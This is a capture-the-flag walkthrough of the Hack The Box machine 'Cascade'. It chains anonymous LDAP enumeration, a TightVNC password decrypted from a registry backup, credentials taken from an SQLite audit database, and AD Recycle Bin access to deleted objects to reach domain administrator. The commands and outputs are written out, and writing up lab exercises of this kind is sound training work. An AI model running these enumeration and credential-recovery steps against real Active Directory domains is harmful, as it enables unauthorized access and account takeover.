## Synopsis

Cascade is a medium difficulty Windows machine configured as a Domain Controller. LDAP
anonymous binds are enabled, and enumeration yields the password for user r.thompson ,
which gives access to a TightVNC registry backup. The backup is decrypted to gain the password
for s.smith . This user has access to a .NET executable, which after decompilation and source
code analysis reveals the password for the ArkSvc account. This account belongs to the AD
Recycle Bin group, and is able to view deleted Active Directory objects. One of the deleted user
accounts is found to contain a hardcoded password, which can be reused to login as the primary
domain administrator.

## Reconnaissance
added cascade.local into host file, each Active Directory domain has a Domain naming context, which contains domain-spesific data. Before enumerate LDAP i'll get naming context first.

```bash
┌─[root@unknown101]─[10.10.14.17]─[~/Desktop/hackthebox/ActiveDirectory/Cascade]
└──╼ #ldapsearch -h $ip -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=cascade,DC=local
namingContexts: CN=Configuration,DC=cascade,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local
namingContexts: DC=DomainDnsZones,DC=cascade,DC=local
namingContexts: DC=ForestDnsZones,DC=cascade,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```

after getting the results from naming context, the next step is to extract the LDAP protocol to gather an information with following command:

```bash
ldapsearch -x -h $ip -D '' -w '' -b "DC=cascade,DC=local" > ldap.log
```

inside ldap.log file we will get the password for user `Ryan Thompson`, easily decrypt with base64 tools.

`r.thompson:rY4n5eva`

### SMB

check using `smbmap` to see what permissions this user has

```bash
┌─[✗]─[root@unknown101]─[10.10.14.17]─[~/Desktop/hackthebox/ActiveDirectory/Cascade]
└──╼ #smbmap -H $ip -u 'r.thompson' -p 'rY4n5eva'
[+] IP: 10.10.10.182:445        Name: cascade.local                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------

        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
```

we get information if we can access to the Data directory with `READ ONLY` Permissions, follow that directory will find Meeting_Notes_June_2018.html files 

Grab this html file using `mget` command

![](/assets/img/cascade/2.png)

inside this html file we've get message from `steve` and find clues containing conversations "Username is TempAdmin (password is the same as the normal admin account password".

```html
For anyone that missed yesterday�s meeting (I�m looking at you Ben). Main points are below:

New production network will be going live on Wednesday so keep an eye out for any issues.

We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. 
Username is TempAdmin (password is the same as the normal admin account password).

The winner of the �Best GPO� competition will be announced on Friday so get your submissions in soon.

Steve
```

for the next enumeration step, we found a VNC file with the name install.reg in the `s.smith` directory

![](/assets/img/cascade/3.png)

```bash
┌─[root@unknown101]─[10.10.14.17]─[~/Desktop/hackthebox/ActiveDirectory/Cascade]
└──╼ #cat VNC\ Install.reg 
Windows Registry Editor Version 5.00
                                               
[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]    
                                               
[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]

[..]
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f   
[..]
"VideoClasses"=""
"VideoRects"=""
```

in the VNC file we will get a hex password, firstly we need to decrypt this hex, googling about `password vnc hex decrypt` and lead me into this [github-script](https://github.com/trinitronx/vncpasswd.py).  

execute command below for decrypt the vnc password with prompt:

```bash
┌─[root@unknown101]─[10.10.14.17]─[~/Desktop/htb-tool/vncpasswd.py]
└──╼ #./vncpasswd.py -H '6bcf2a4b6e5aca0f' -d
Decrypted Bin Pass= 'sT333ve2'
Decrypted Hex Pass= '7354333333766532'

#-H for hex
#-d for decrypt
```

login using `evil-winrm` as `s.smith` using this credentials and grab user.txt

## Escalate Arksvc user

long short story i was wondering about all these user inside server, using `net user` command for listing all user information.

![](/assets/img/cascade/11.png)

executing the command `net user arksvc` will retrieve an information about a specific user

```powershell
*Evil-WinRM* PS C:\Users\s.smith\Documents> net user arksvc
User name                    arksvc
Full Name                    ArkSvc

The command completed successfully.
```

re-enumerate the smb protocol using the credentials from `s.smith`, and check permissions with `smbmap` tools

![](/assets/img/cascade/5.png)

as you can see this user has `READ ONLY` permissions into `$audit` share, let's login into this share.

![](/assets/img/cascade/12.png)

going to /DB/ directory will find `Audit.db` file, download this file into host to analyze it.

using `file` command will get an information if they use `sqlite3` as database

```bash
┌─[root@unknown101]─[10.10.14.17]─[~/Desktop/hackthebox/ActiveDirectory/Cascade]
└──╼ #file Audit.db 
Audit.db: SQLite 3.x database, last written using SQLite version 3027002
```
inside Audit.db we can found 3 tables such as `DeleteUserAudit`,`Ldap`, and `Misc`. First of all im gonna dump `DeleteUserAudit` tables 

```bash
sqlite> select * from DeletedUserAudit
   ...> ;
6|test|Test
DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
7|deleted|deleted guy
DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local
9|TempAdmin|TempAdmin
DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local
```

ldap tables result:

```bash
sqlite> select * from Ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```

unfortunately that hash is not base64, copying this hash into browser will lead me into this decryptor password online.

![](/assets/img/cascade/6.png)

we able to decrypt that hash, from now we can login using `evil-winrm` as arksvc

![](/assets/img/cascade/13.png)

## Privilege Escalation

after lot of effort we can reach the last step of this box. This `arkvc` user part of group AD Recycle Bin, back to the initial stage when we get information regarding `tempadmin` having the same password as administrator

```powershell
Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
[SNIP]
CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
[SNIP]
```

why `Ad Recycle Bin` Group it's to dangerous ? in short this feature was to facilitate the recovery of deleted Active Directory objects without requiring restoration of backups, to accomplish these goals, the AD Recycle Bin introduced changes to the behaviour of the Active Directory object deletion lifecycle.

run this command below to check if `tempadmin` is deleted or not.

```powershell
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
```

![](/assets/img/cascade/7.png)

but when i tried to restore this user i've get following error similiar below

![](/assets/img/cascade/8.png)

so the point is we didnt have to restore any object, but we only need information about this `TempAdmin` user.

we can dump information about this user with run single command 

```powershell
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

```powershell
[..]
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  : 
ObjectClass                     : container
ObjectGUID                      : 746385f2-e3a0-4252-b83a-5a206da0ed88
[SNIP]
accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
[SNIP]
[...]
```

as you can see we retrive an information about password on `CascadeLegacyPwd` section, decrypt this hash with base64 then login with `evil-winrm` as administrator.
